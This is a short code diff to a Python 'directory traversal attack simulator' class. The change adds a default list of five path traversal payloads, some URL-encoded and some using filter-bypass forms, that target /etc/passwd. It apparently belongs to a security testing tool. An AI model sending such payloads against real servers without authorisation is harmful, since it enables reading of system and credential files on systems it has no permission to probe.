@@ -54,10 +54,16 @@ DEFAULT_PAYLOADS = [
 class DirectoryTraversalAttack:
     """Directory traversal attack simulator."""
 
-    def __init__(self, url: str, param: str, payloads: list[str], verbose: bool = False):
+    def __init__(self, url: str, param: str, payloads: list[str] | None = None, verbose: bool = False):
         self.url = url
         self.param = param
-        self.payloads = payloads
+        self.payloads = payloads if payloads is not None else [
+            "../../../etc/passwd",
+            "../../../../etc/passwd",
+            "../../../../../etc/passwd",
+            "..%2F..%2F..%2Fetc%2Fpasswd",
+            "....//....//....//etc/passwd",
+        ]
         self.verbose = verbose
         self.attempts = 0
         self.found_vulnerabilities = []
